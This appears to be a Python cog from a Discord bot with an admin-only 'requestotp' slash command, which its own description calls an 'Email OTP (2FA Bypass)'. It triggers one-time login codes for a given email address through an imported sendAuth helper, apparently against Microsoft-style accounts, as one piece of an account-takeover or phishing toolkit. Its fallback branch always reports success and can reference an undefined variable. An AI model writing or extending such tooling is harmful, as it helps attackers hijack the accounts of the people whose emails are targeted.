from discord.ext import commands
import discord

from views.utils.sendAuth import sendAuth

class requestOTP(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @discord.slash_command(name="requestotp", description="Email OTP (2FA Bypass)")
    async def requestotp(self, ctx: discord.ApplicationContext, email: str):

        if ctx.author.id not in self.bot.admins:
            await ctx.respond("You do not have permission to execute this command!", ephemeral=True)
            return

        response = await sendAuth(email)
        
        if "OtcLoginEligibleProofs" in response["Credentials"]:

            for value in response["Credentials"]["OtcLoginEligibleProofs"]:
                if value["otcSent"]:
                    await ctx.respond(
                        embed = discord.Embed(
                            description = f"Sucessfully sent OTP to `{value['display']}`",
                            color = 0x678DC6
                        ),
                        ephemeral=True
                    )
                    return
            
        await ctx.respond(
            embed = discord.Embed(
                description = f"Sucessfully sent OTP to `{value['display']}`",
                color = 0x678DC6
                ),
                ephemeral=True
        )

def setup(bot: commands.Bot) -> None:
    bot.add_cog(requestOTP(bot))